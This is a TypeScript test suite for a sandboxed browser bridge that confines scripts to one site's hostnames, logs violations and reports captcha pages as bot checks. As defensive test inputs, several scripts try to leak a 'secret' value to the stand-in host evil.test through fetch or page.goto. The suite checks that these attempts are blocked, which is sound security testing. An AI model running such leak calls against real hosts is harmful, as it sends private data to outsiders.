import { describe, expect, it, vi } from "vitest";
import { FakeAsideRepl } from "../../../test/support/fake-aside-repl.js";
import { OutcomeError } from "../../core/outcome.js";
import type { Logger } from "../../ports/logger.js";
import type { SiteLease } from "../../ports/scheduler.js";
import { AsideBrowserPort } from "./port.js";

function spyLogger() {
  const warn = vi.fn();
  const logger: Logger = { debug: vi.fn(), info: vi.fn(), warn, error: vi.fn() };
  return { logger, warn };
}

function setup(options: { warmTabTtlMs?: number; maxWarmTabsPerSite?: number } = {}) {
  const repl = new FakeAsideRepl();
  const { logger, warn } = spyLogger();
  const port = new AsideBrowserPort({
    repl,
    logger,
    warmTabTtlMs: options.warmTabTtlMs ?? 0,
    stepTimeoutMs: 5000,
    maxWarmTabsPerSite: options.maxWarmTabsPerSite,
  });
  return { repl, port, warn };
}

const scope = { siteKey: "example", hostnames: ["example.com"] };

describe("AsideBrowserPort", () => {
  it("reports status through a probe call", async () => {
    const { port } = setup();
    await expect(port.status()).resolves.toEqual({ reachable: true, account: "u0" });
  });

  it("reports an unreachable REPL as not reachable with the outcome message", async () => {
    const { port, repl } = setup();
    await repl.close();
    const s = await port.status();
    expect(s).toMatchObject({ reachable: false, account: "u0" });
    expect(s.message).toBeTruthy();
  });

  it("opens a bridge tab on the site, installs the filter first, and closes it on dispose", async () => {
    const { port, repl } = setup();
    const session = await port.openSession(scope);
    const tab = await session.openTab("https://example.com/");
    expect(tab.url).toBe("https://example.com/");
    const page = repl.pages.get(tab.id)!;
    expect(page.blockPatterns.length).toBeGreaterThan(0);
    expect(page.initScripts).toHaveLength(2);
    expect(page.navigations).toEqual(["https://example.com/"]);
    await session.dispose();
    expect(repl.pages.size).toBe(0);
    expect(repl.closedTabs).toEqual([tab.id]);
    expect(repl.userTab.navigations).toEqual([]);
  });

  it("rejects a cross-host openTab before reaching the REPL and logs the violation", async () => {
    const { port, repl, warn } = setup();
    const session = await port.openSession(scope);
    await expect(session.openTab("https://evil.test/")).rejects.toMatchObject({ status: "adapter_error" });
    expect(repl.calls).toHaveLength(0);
    expect(warn).toHaveBeenCalledWith(
      "browser shim violation",
      expect.objectContaining({ site: "example", kind: "openTab" }),
    );
  });

  it("rejects a cross-host cookie fetch and allows a same-host one without set-cookie", async () => {
    const { port, repl } = setup();
    repl.responses.set("https://example.com/api", {
      status: 200,
      headers: { "set-cookie": "a=b", "x-y": "1" },
      body: "{}",
    });
    const session = await port.openSession(scope);
    await expect(session.fetch("https://evil.test/api")).rejects.toMatchObject({ status: "adapter_error" });
    const r = await session.fetch("https://example.com/api");
    expect(r).toEqual({ status: 200, url: "https://example.com/api", headers: { "x-y": "1" }, text: "{}" });
    expect(repl.fetchLog.map((f) => f.url)).toEqual(["https://example.com/api"]);
  });

  it("rejects a statically forbidden script with adapter_error, logs it, and never sends it", async () => {
    const { port, repl, warn } = setup();
    const session = await port.openSession(scope);
    await expect(session.runScript("return Object.keys(fs);")).rejects.toMatchObject({
      status: "adapter_error",
      message: expect.stringContaining('forbidden identifier "fs"') as string,
    });
    expect(repl.calls).toHaveLength(0);
    expect(warn).toHaveBeenCalledWith(
      "browser shim violation",
      expect.objectContaining({ kind: "forbidden-identifier", detail: "fs" }),
    );
  });

  it("fails a runtime violation (cross-host goto) with adapter_error and logs only the host", async () => {
    const { port, warn } = setup();
    const session = await port.openSession(scope);
    const tab = await session.openTab("https://example.com/");
    await expect(
      session.runScript(`try { await page.goto("https://evil.test/?q=secret"); } catch (e) {} return 1;`, {
        tab,
      }),
    ).rejects.toMatchObject({
      status: "adapter_error",
      message: expect.stringContaining("evil.test") as string,
    });
    expect(warn).toHaveBeenCalledWith("browser shim violation", {
      site: "example",
      kind: "navigation",
      detail: "evil.test",
    });
    expect(JSON.stringify(warn.mock.calls)).not.toContain("secret");
  });

  it("fails a step whose page.evaluate hit a blocked cross-host request, and logs it", async () => {
    const { port, repl, warn } = setup();
    const session = await port.openSession(scope);
    const tab = await session.openTab("https://example.com/");
    await expect(
      session.runScript(
        `return await page.evaluate(async () => { try { await fetch("https://evil.test/c?d=secret"); } catch (e) {} return 1; });`,
        { tab },
      ),
    ).rejects.toMatchObject({
      status: "adapter_error",
      message: expect.stringContaining("request to evil.test") as string,
    });
    expect(warn).toHaveBeenCalledWith("browser shim violation", {
      site: "example",
      kind: "request",
      detail: "evil.test",
    });
    expect(repl.pageRequests).toEqual([]);
  });

  describe("a page script that runs into a bot check", () => {
    const evaluateFetch = (url: string) =>
      `return await page.evaluate(async () => { try { await fetch(${JSON.stringify(url)}); } catch (e) {} return 1; });`;

    it("a blocked request to a captcha vendor host fails as a blocked access_denied, still blocked and logged", async () => {
      const { port, repl, warn } = setup();
      const session = await port.openSession(scope);
      const tab = await session.openTab("https://example.com/");
      const failure = session.runScript(
        evaluateFetch("https://geo.captcha-delivery.com/captcha/?initialCid=secret"),
        { tab },
      );
      await expect(failure).rejects.toBeInstanceOf(OutcomeError);
      await expect(failure).rejects.toMatchObject({
        status: "access_denied",
        blocked: true,
        message: "example answered with a bot check (geo.captcha-delivery.com)",
      });
      // The request stayed blocked and the violation is logged as before (host only).
      expect(repl.pageRequests).toEqual([]);
      expect(warn).toHaveBeenCalledWith("browser shim violation", {
        site: "example",
        kind: "request",
        detail: "geo.captcha-delivery.com",
      });
      expect(JSON.stringify(warn.mock.calls)).not.toContain("secret");
      // Nothing was widened: the tab's filter allows no vendor host.
      const patterns = repl.pages.get(tab.id)!.blockPatterns;
      expect(patterns.filter((p) => !p.block).every((p) => p.urlPattern.includes("example.com"))).toBe(true);
    });

    it("path-limited vendor entries (google.com, gstatic.com) match on the host alone", async () => {
      const { port } = setup();
      const session = await port.openSession(scope);
      const tab = await session.openTab("https://example.com/");
      for (const [url, host] of [
        ["https://www.google.com/recaptcha/api2/anchor?k=1", "www.google.com"],
        ["https://www.google.com/maps", "www.google.com"],
        ["https://www.gstatic.com/fonts/x.woff", "www.gstatic.com"],
        ["https://challenges.cloudflare.com/turnstile/v0/api.js", "challenges.cloudflare.com"],
        ["https://js.hcaptcha.com/1/api.js", "js.hcaptcha.com"],
        ["https://static.geetest.com/v4/gt4.js", "static.geetest.com"],
      ] as const) {
        await expect(session.runScript(evaluateFetch(url), { tab })).rejects.toMatchObject({
          status: "access_denied",
          blocked: true,
          message: `example answered with a bot check (${host})`,
        });
      }
    });

    it("any other blocked host keeps the adapter_error rule (look-alike vendor names included)", async () => {
      const { port } = setup();
      const session = await port.openSession(scope);
      const tab = await session.openTab("https://example.com/");
      for (const host of [
        "evil.test",
        "notcaptcha-delivery.com",
        "captcha-delivery.com.evil.test",
        "cloudflare.com",
      ]) {
        const failure = session.runScript(evaluateFetch(`https://${host}/x`), { tab });
        await expect(failure).rejects.toMatchObject({
          status: "adapter_error",
          blocked: false,
          message: `page script blocked by the bridge: request to ${host} is outside the site's hostnames`,
        });
      }
    });

    it("a vendor host and another host in one step: the bot check wins; both are logged", async () => {
      const { port, repl, warn } = setup();
      const session = await port.openSession(scope);
      const tab = await session.openTab("https://example.com/");
      const store = repl.pages.get(tab.id)!.guardStore;
      store.push({ kind: "request", host: "evil.test", attributed: true });
      store.push({ kind: "request", host: "js.hcaptcha.com", attributed: true });
      await expect(session.runScript("return 1;", { tab })).rejects.toMatchObject({
        status: "access_denied",
        blocked: true,
        message: "example answered with a bot check (js.hcaptcha.com)",
      });
      expect(warn).toHaveBeenCalledWith("browser shim violation", {
        site: "example",
        kind: "request",
        detail: "evil.test",
      });
      expect(warn).toHaveBeenCalledWith("browser shim violation", {
        site: "example",
        kind: "request",
        detail: "js.hcaptcha.com",
      });
    });

    it("a same-site request the site redirects to a vendor host is a bot check too", async () => {
      const { port, repl } = setup();
      repl.responses.set("https://example.com/api", {
        status: 302,
        headers: { location: "https://geo.captcha-delivery.com/captcha/?c=1" },
        body: "",
      });
      const session = await port.openSession(scope);
      await expect(
        session.runScript(`await fetch("https://example.com/api"); return 1;`),
      ).rejects.toMatchObject({
        status: "access_denied",
        blocked: true,
        message: "example answered with a bot check (geo.captcha-delivery.com)",
      });
      expect(repl.fetchLog.map((f) => f.url)).toEqual(["https://example.com/api"]);
    });

    it("the script's own fetch or openTab of a vendor URL is the adapter's doing: adapter_error", async () => {
      const { port, repl } = setup();
      const session = await port.openSession(scope);
      for (const call of [
        `try { await fetch("https://geo.captcha-delivery.com/captcha/"); } catch (e) {} return 1;`,
        `try { await openTab("https://www.google.com/recaptcha/api2/anchor"); } catch (e) {} return 1;`,
      ]) {
        await expect(session.runScript(call)).rejects.toMatchObject({
          status: "adapter_error",
          blocked: false,
        });
      }
      expect(repl.fetchLog).toEqual([]);
    });

    it("only page-script steps are mapped: a tab open that lands on a vendor host stays adapter_error", async () => {
      const { port, repl } = setup();
      repl.redirects.set("https://example.com/gate", "https://geo.captcha-delivery.com/interstitial/");
      const session = await port.openSession(scope);
      await expect(session.openTab("https://example.com/gate")).rejects.toMatchObject({
        status: "adapter_error",
        blocked: false,
        message: expect.stringContaining("navigation to geo.captcha-delivery.com") as string,
      });
    });
  });

  it("does not fail a step for requests the site's own scripts made; logs them at debug", async () => {
    const repl = new FakeAsideRepl();
    const debug = vi.fn();
    const port = new AsideBrowserPort({
      repl,
      logger: { debug, info: vi.fn(), warn: vi.fn(), error: vi.fn() },
      warmTabTtlMs: 0,
    });
    const session = await port.openSession(scope);
    const tab = await session.openTab("https://example.com/");
    repl.pages.get(tab.id)!.guardStore.push({ kind: "request", host: "ads.test", attributed: false });
    await expect(session.runScript("return 1;", { tab })).resolves.toBe(1);
    expect(debug).toHaveBeenCalledWith("requests blocked by the tab filter", {
      site: "example",
      hosts: "ads.test",
    });
  });

  it("closes popups left by a session when it is disposed, and logs off-site ones", async () => {
    const { port, repl, warn } = setup();
    const session = await port.openSession(scope);
    const tab = await session.openTab("https://example.com/");
    const popup = repl.spawnPopup("https://evil.test/late", { attach: true });
    await session.dispose();
    expect(repl.pages.has(popup.targetId)).toBe(false);
    expect(warn).toHaveBeenCalledWith("browser shim violation", {
      site: "example",
      kind: "popup",
      detail: "evil.test",
    });
    expect(repl.pages.has(tab.id)).toBe(false);
  });

  it("runs a script against the session's default tab and returns its JSON result", async () => {
    const { port, repl } = setup();
    repl.titles.set("https://example.com/", "Example Domain");
    const session = await port.openSession(scope);
    await session.openTab("https://example.com/");
    const v = await session.runScript(
      "return { title: await page.title(), n: args.n * 2, gmail: typeof gmail };",
      { args: { n: 21 } },
    );
    expect(v).toEqual({ title: "Example Domain", n: 42, gmail: "undefined" });
  });

  it("remembers the last on-site page its tabs showed (lastUrl), never a fetch or an off-site page", async () => {
    const { port, repl } = setup();
    const session = await port.openSession(scope);
    expect(session.lastUrl()).toBeNull();
    // A redirect on the site: the final main-frame URL counts.
    repl.redirects.set("https://example.com/search?q=x", "https://www.example.com/search/?q=x");
    await session.openTab("https://example.com/search?q=x");
    expect(session.lastUrl()).toBe("https://www.example.com/search/?q=x");
    await session.runScript(`await page.goto("https://example.com/search?q=x&page=2"); return 1;`);
    expect(session.lastUrl()).toBe("https://example.com/search?q=x&page=2");
    repl.responses.set("https://example.com/api", { status: 200, body: "{}" });
    await session.fetch("https://example.com/api");
    expect(session.lastUrl()).toBe("https://example.com/search?q=x&page=2");
    // A server redirect off the site fails the step and is not remembered.
    repl.redirects.set("https://example.com/out", "https://evil.test/landing");
    await expect(session.openTab("https://example.com/out")).rejects.toMatchObject({
      status: "adapter_error",
    });
    expect(session.lastUrl()).toBe("https://example.com/search?q=x&page=2");
    await session.dispose();
  });

  it("shadows REPL globals it did not know about by retrying once", async () => {
    const { port, repl } = setup();
    const session = await port.openSession(scope);
    // The vm context has builtins (e.g. Atomics, WebAssembly) outside the standard list.
    await expect(session.runScript("return 7;")).resolves.toBe(7);
    expect(repl.calls).toHaveLength(2);
    await expect(session.runScript("return 8;")).resolves.toBe(8);
    expect(repl.calls).toHaveLength(3);
  });

  it("takes a snapshot and a screenshot of an owned tab only", async () => {
    const { port, repl } = setup();
    repl.titles.set("https://example.com/", "Example Domain");
    const session = await port.openSession(scope);
    const tab = await session.openTab("https://example.com/");
    await expect(session.snapshot(tab)).resolves.toContain('title: "Example Domain"');
    await expect(session.snapshot(tab, { maxChars: 5 })).resolves.toHaveLength(5);
    await expect(session.screenshot(tab)).resolves.toEqual({ mimeType: "image/png", base64: "iVBORw0KGgo=" });
    await expect(session.snapshot({ id: "USER-TAB", url: "" })).rejects.toMatchObject({
      status: "adapter_error",
    });
    await expect(session.closeTab({ id: "USER-TAB", url: "" })).rejects.toMatchObject({
      status: "adapter_error",
    });
    expect(repl.userTab.navigations).toEqual([]);
  });

  it("treats tabs from before a REPL restart as gone", async () => {
    const { port, repl } = setup();
    const session = await port.openSession(scope);
    const tab = await session.openTab("https://example.com/");
    repl.restart();
    await expect(session.snapshot(tab)).rejects.toMatchObject({ status: "browser_unavailable" });
    await session.dispose(); // must not try to close tabs of the old generation
    expect(repl.closedTabs).toEqual([]);
  });

  it("keeps the last tab warm for the next session of the same site, then closes it after the TTL", async () => {
    const { port, repl } = setup({ warmTabTtlMs: 80 });
    const s1 = await port.openSession(scope);
    const t1 = await s1.openTab("https://example.com/a");
    await s1.dispose();
    expect(repl.pages.has(t1.id)).toBe(true);

    const s2 = await port.openSession(scope);
    const t2 = await s2.openTab("https://example.com/b");
    expect(t2.id).toBe(t1.id); // reused, no new tab
    expect(repl.pages.size).toBe(1);
    await s2.dispose();

    const other = await port.openSession({ siteKey: "other", hostnames: ["other.test"] });
    const t3 = await other.openTab("https://other.test/");
    expect(t3.id).not.toBe(t1.id); // a warm tab is never shared across sites
    await other.dispose();

    await new Promise((r) => setTimeout(r, 200));
    expect(repl.pages.size).toBe(0);
    await port.shutdown();
  });

  it("keeps up to maxWarmTabsPerSite warm tabs per site; parallel sessions each take a free one", async () => {
    const { port, repl } = setup({ warmTabTtlMs: 60_000, maxWarmTabsPerSite: 3 });
    // Four parallel sessions of one site, each with its own tab.
    const sessions = await Promise.all([1, 2, 3, 4].map(() => port.openSession(scope)));
    const tabs = await Promise.all(sessions.map((s, i) => s.openTab(`https://example.com/${i}`)));
    expect(new Set(tabs.map((t) => t.id)).size).toBe(4);
    for (const s of sessions) await s.dispose();
    // Three stay warm: keeping a fourth closes the oldest warm tab.
    expect(repl.pages.size).toBe(3);
    expect(repl.closedTabs).toEqual([tabs[0]!.id]);

    // Three new parallel sessions reuse the three warm tabs, one each; a fourth opens a new tab.
    const again = await Promise.all([1, 2, 3, 4].map(() => port.openSession(scope)));
    const reused = await Promise.all(again.map((s, i) => s.openTab(`https://example.com/again/${i}`)));
    const warmIds = new Set(tabs.slice(1).map((t) => t.id));
    expect(reused.filter((t) => warmIds.has(t.id))).toHaveLength(3);
    expect(new Set(reused.map((t) => t.id)).size).toBe(4);
    expect(repl.pages.size).toBe(4);
    for (const s of again) await s.dispose();
    expect(repl.pages.size).toBe(3);

    // Another site's warm tabs are kept separately and never shared.
    const other = await port.openSession({ siteKey: "other", hostnames: ["other.test"] });
    const t = await other.openTab("https://other.test/");
    expect(reused.some((r) => r.id === t.id)).toBe(false);
    await other.dispose();
    expect(repl.pages.size).toBe(4);
    await port.shutdown();
    expect(repl.pages.size).toBe(0);
  });

  it("keeps up to 3 warm tabs per site by default (the default pool size)", async () => {
    const { port, repl } = setup({ warmTabTtlMs: 60_000 });
    const sessions = await Promise.all([1, 2, 3, 4].map(() => port.openSession(scope)));
    await Promise.all(sessions.map((s, i) => s.openTab(`https://example.com/${i}`)));
    for (const s of sessions) await s.dispose();
    expect(repl.pages.size).toBe(3);
    await port.shutdown();
  });

  it("closes every bridge tab on shutdown", async () => {
    const { port, repl } = setup({ warmTabTtlMs: 60_000 });
    const s1 = await port.openSession(scope);
    await s1.openTab("https://example.com/a");
    await s1.openTab("https://example.com/b");
    await s1.dispose(); // one warm, one closed
    const s2 = await port.openSession({ siteKey: "x", hostnames: ["x.test"] });
    await s2.openTab("https://x.test/");
    await port.shutdown();
    expect(repl.pages.size).toBe(0);
    expect(repl.closed).toBe(true);
  });

  it("honors the lease's politeness interval for tab opens and in-script navigations", async () => {
    const { port } = setup();
    const before = vi.fn(async () => undefined);
    const record = vi.fn();
    const lease: SiteLease = {
      site: "example",
      signal: new AbortController().signal,
      minIntervalMs: 100,
      beforePageLoad: before,
      nextPageLoadAt: () => Date.now() + 100,
      recordPageLoad: record,
    };
    const session = await port.openSession({ ...scope, lease });
    await session.openTab("https://example.com/");
    expect(before).toHaveBeenCalledOnce();
    const start = Date.now();
    await session.runScript(`await page.goto("https://example.com/2"); return 1;`);
    expect(Date.now() - start).toBeGreaterThanOrEqual(95);
    expect(record).toHaveBeenCalledOnce();
    await session.dispose();
  });

  it("refuses work after the scope's signal aborted", async () => {
    const { port, repl } = setup();
    const ac = new AbortController();
    const session = await port.openSession({ ...scope, signal: ac.signal });
    ac.abort();
    await expect(session.runScript("return 1;")).rejects.toMatchObject({ status: "timeout" });
    expect(repl.calls).toHaveLength(0);
  });

  it("rejects an invalid scope", async () => {
    const { port } = setup();
    await expect(port.openSession({ siteKey: "x", hostnames: [] })).rejects.toMatchObject({
      status: "adapter_error",
    });
  });
});
